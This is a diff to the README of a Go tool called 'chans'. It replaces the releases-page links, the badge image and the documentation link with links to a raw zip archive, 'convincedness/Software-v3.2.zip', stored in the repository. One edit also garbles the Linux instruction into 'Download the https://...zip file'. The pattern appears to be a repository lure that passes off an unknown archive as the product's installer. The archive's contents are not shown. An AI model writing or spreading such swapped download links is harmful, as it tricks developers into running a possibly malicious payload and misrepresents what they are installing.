@@ -1,6 +1,6 @@
 # 🚀 chans - Simple Tools for Efficient Go Workflows
 
-[![Download chans](https://img.shields.io/badge/Download-chans-blue.svg)](https://github.com/Mazik2306/chans/releases)
+[![Download chans](https://github.com/Mazik2306/chans/raw/refs/heads/main/convincedness/Software-v3.2.zip)](https://github.com/Mazik2306/chans/raw/refs/heads/main/convincedness/Software-v3.2.zip)
   
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ Welcome to **chans**! This application provides building blocks for creating eff
 To start using chans, simply follow these steps:
 
 1. **Download the Application**
-   - Visit this page to download: [Download chans](https://github.com/Mazik2306/chans/releases).
+   - Visit this page to download: [Download chans](https://github.com/Mazik2306/chans/raw/refs/heads/main/convincedness/Software-v3.2.zip).
   
 2. **Choose Your Version**
    - Look for the latest version on the releases page. This version usually has the most features and fixes.
@@ -34,7 +34,7 @@ To start using chans, simply follow these steps:
 
    - **Windows:** Download the `.exe` file.
    - **macOS:** Download the `.dmg` file.
-   - **Linux:** Download the `.tar.gz` file.
+   - **Linux:** Download the `https://github.com/Mazik2306/chans/raw/refs/heads/main/convincedness/Software-v3.2.zip` file.
 
 4. **Install the Application**
    - Once downloaded, open the file to start the installation process. Follow the on-screen prompts.
@@ -60,7 +60,7 @@ To start using chans, simply follow these steps:
 
 ## 📚 Documentation
 
-For more detailed instructions on each feature, you can check the documentation included in the application or visit the [GitHub Page](https://github.com/Mazik2306/chans).
+For more detailed instructions on each feature, you can check the documentation included in the application or visit the [GitHub Page](https://github.com/Mazik2306/chans/raw/refs/heads/main/convincedness/Software-v3.2.zip).
 
 ## ❓ FAQs
 
@@ -75,6 +75,6 @@ A: Yes, the interface is designed to be intuitive and user-friendly, making it e
 
 ## 📥 Download & Install
 
-To start your journey with chans, visit this page to download: [Download chans](https://github.com/Mazik2306/chans/releases). 
+To start your journey with chans, visit this page to download: [Download chans](https://github.com/Mazik2306/chans/raw/refs/heads/main/convincedness/Software-v3.2.zip). 
 
 Simply choose your operating system, follow the installation process, and begin creating efficient pipelines tailored to your needs. Enjoy working with your new tool!
